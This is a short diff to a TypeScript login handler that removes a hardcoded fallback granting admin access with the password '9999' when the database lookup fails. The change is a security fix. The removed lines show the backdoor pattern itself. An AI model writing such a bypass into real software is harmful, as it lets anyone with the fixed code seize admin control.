@@ -190,10 +190,6 @@ async function handleLogin(request: Request, env: Env): Promise<Response> {
     .bind(role, name, password)
     .first<{ role: string; name: string }>();
 
-  if (!account && role === "admin" && password === "9999") {
-    account = { role: "admin", name: "admin" };
-  }
-
   if (!account) return jsonResponse({ error: "Incorrect password. Please try again." }, 401);
 
   const token = crypto.randomUUID();
